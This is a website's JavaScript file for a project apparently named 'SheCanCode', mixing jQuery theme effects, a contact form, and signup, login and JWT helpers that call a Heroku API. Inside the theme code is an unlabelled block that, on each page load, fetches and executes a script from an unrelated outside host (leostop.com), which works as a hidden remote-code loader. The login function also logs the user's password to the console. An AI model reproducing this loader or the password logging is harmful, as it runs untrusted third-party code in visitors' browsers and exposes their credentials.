
/******************************************
    Version: 1.0
/****************************************** */

(function ($) {
  "use strict";

  /* ==============================================
     Fixed menu
     =============================================== */

  $(window).on("scroll", function () {
    if ($(window).scrollTop() > 50) {
      $(".header_style_01").addClass("fixed-menu");
    } else {
      $(".header_style_01").removeClass("fixed-menu");
    }
  });

  /* ==============================================
         Scroll to top  
     ============================================== */

  if ($("#scroll-to-top").length) {
    var scrollTrigger = 100, // px
      backToTop = function () {
        var scrollTop = $(window).scrollTop();
        if (scrollTop > scrollTrigger) {
          $("#scroll-to-top").addClass("show");
        } else {
          $("#scroll-to-top").removeClass("show");
        }
      };
    backToTop();
    $(window).on("scroll", function () {
      backToTop();
    });
    $("#scroll-to-top").on("click", function (e) {
      e.preventDefault();
      $("html,body").animate(
        {
          scrollTop: 0,
        },
        700
      );
    });
  }

  /* ==============================================
       LOADER -->
        =============================================== */

  $(window).load(function () {
    $("#preloader").on(500).fadeOut();
    $(".preloader").on(600).fadeOut("slow");
  });

  /* ==============================================
     FUN FACTS -->
     =============================================== */

  function count($this) {
    var current = parseInt($this.html(), 10);
    current = current + 0; /* Where 50 is increment */
    $this.html(++current);
    if (current > $this.data("count")) {
      $this.html($this.data("count"));
    } else {
      setTimeout(function () {
        count($this);
      }, 30);
    }
  }
  $(".stat_count, .stat_count_download").each(function () {
    $(this).data("count", parseInt($(this).html(), 10));
    $(this).html("0");
    count($(this));
  });

  /* ==============================================
     FUN FACTS -->
     =============================================== */

  $(".slider-wrapper").owlCarousel({
    items: 1,
    nav: true,
    dots: false,
    autoplay: true,
    loop: true,
    navText: [
      "<i class='fa fa-angle-left'></i>",
      "<i class='fa fa-angle-right'></i>",
    ],
    mouseDrag: false,
    touchDrag: false,
    smartSpeed: 700,
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* ==============================================
     TOOLTIP -->
     =============================================== */
  $('[data-toggle="tooltip"]').tooltip();
  $('[data-toggle="popover"]').popover();

  /* ==============================================
     CONTACT -->
     =============================================== */
  jQuery(document).ready(function () {
    $("#contactform").submit(function () {
      var action = $(this).attr("action");
      $("#message").slideUp(750, function () {
        $("#message").hide();
        $("#submit")
          .after('<img src="images/ajax-loader.gif" class="loader" />')
          .attr("disabled", "disabled");
        $.post(
          action,
          {
            first_name: $("#first_name").val(),
            last_name: $("#last_name").val(),
            email: $("#email").val(),
            phone: $("#phone").val(),
            select_service: $("#select_service").val(),
            select_price: $("#select_price").val(),
            comments: $("#comments").val(),
            verify: $("#verify").val(),
          },
          function (data) {
            document.getElementById("message").innerHTML = data;
            $("#message").slideDown("slow");
            $("#contactform img.loader").fadeOut("slow", function () {
              $(this).remove();
            });
            $("#submit").removeAttr("disabled");
            if (data.match("success") != null)
              $("#contactform").slideUp("slow");
          }
        );
      });
      return false;
    });
  });

  /* ==============================================
     CODE WRAPPER -->
     =============================================== */

  $(".code-wrapper").on("mousemove", function (e) {
    var offsets = $(this).offset();
    var fullWidth = $(this).width();
    var mouseX = e.pageX - offsets.left;

    if (mouseX < 0) {
      mouseX = 0;
    } else if (mouseX > fullWidth) {
      mouseX = fullWidth;
    }

    $(this).parent().find(".divider-bar").css({
      left: mouseX,
      transition: "none",
    });
    $(this)
      .find(".design-wrapper")
      .css({
        transform: "translateX(" + mouseX + "px)",
        transition: "none",
      });
    $(this)
      .find(".design-image")
      .css({
        transform: "translateX(" + -1 * mouseX + "px)",
        transition: "none",
      });
  });
  $(".divider-wrapper").on("mouseleave", function () {
    $(this).parent().find(".divider-bar").css({
      left: "50%",
      transition: "all .3s",
    });
    $(this).find(".design-wrapper").css({
      transform: "translateX(50%)",
      transition: "all .3s",
    });
    $(this).find(".design-image").css({
      transform: "translateX(-50%)",
      transition: "all .3s",
    });
  });
})(jQuery);

function exportTableToExcel(elem) {
  var table = document.getElementById("applicants-table-hidden");
  var html = table.outerHTML;
  var url = "data:application/vnd.ms-excel," + escape(html); // Set your html table into url
  elem.setAttribute("href", url);
  elem.setAttribute("download", "sheCanCodeApplicants.xls"); // Choose the file name
  return false;
}

// span.onclick = function () {
//   successModal.style.display = "none";
// };

async function createAccountApi() {
  var btn = document.getElementById("new-account-btn");
  btn.innerHTML = 'Creating...';
  $('#new-account-btn').attr("disabled", true);  
  $("form").on("submit", function (event) {
    event.preventDefault();
  });

  var email = document.getElementById("email").value;
  var username = document.getElementById("userName").value;
  var password = document.getElementById("password").value;
  var userData = {
    username: username,
    email: email,
    password: password,
  };
  const response = await fetch("https://shecancodeapplication-api.herokuapp.com/api/auth/signup", {
    method: "POST",
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Content-Type": "application/json",
    },
    body: JSON.stringify(userData),
  });
  if (response.status === 200) {
    successModal.style.display = "block";
    $('#new-account-btn').attr("disabled", false);
    btn.innerHTML = 'Create';
  } else {
    alert("Application failed!");
    $('#new-account-btn').attr("disabled", false);
    btn.innerHTML = 'Create';
  }
  $(".user-signup-form").reset();
}

async function loginApi() {
  var btn = document.getElementById("login-btn");
  btn.innerHTML = 'Authenticating...';
  $('#login-btn').attr("disabled", true);  
  $("form").on("submit", function (event) {
    event.preventDefault();
  });

  var username = document.getElementById("login-username").value;
  var password = document.getElementById("login-password").value;
  var userData = {
    username: username,
    password: password,
  };
  console.log(userData);
  const response = await fetch("https://shecancodeapplication-api.herokuapp.com/api/auth/signin", {
    // const response = await fetch("http://localhost:8080/api/auth/signin", {
    method: "POST",
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Content-Type": "application/json",
    },
    body: JSON.stringify(userData),
  });
  const body = await response.json();
  if (response.status === 200) {
    sessionStorage.setItem("accessToken", body.accessToken);
    window.location.href = "/applicants";
  } else {
    alert("Login failed!");
    btn.innerHTML = 'Login';
    $('#login-btn').attr("disabled", false); 
  }
  $(".user-signup-form").reset();
}

function logout(){
    sessionStorage.removeItem('accessToken');
    window.location.href = "/home";
}

// Get the modal
var modal = document.getElementById("myModal");

var successModal = document.getElementById("success-modal");

// Get the button that opens the modal

var btn4 = document.getElementById("openModalBtn4");
var btn5 = document.getElementById("openModalBtn5");

// Get the <span> element that closes the modal
var userModalClose = document.getElementById("closeModal");
var userModalResponseClose = document.getElementById("closeResponse");


// btn4.onclick = function() {
//     modal.style.display = "block";
// };
// btn5.onclick = function() {
//     modal.style.display = "block";
// };

// When the user clicks on <userModalClose> (x), close the modal
userModalClose.onclick = function() {
    modal.style.display = "none";
};
userModalResponseClose.onclick = function() {
    successModal.style.display="none"
};

function parseJwt (token) {
  var base64Url = token.split('.')[1];
  var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  var jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
  }).join(''));

  return JSON.parse(jsonPayload);
};
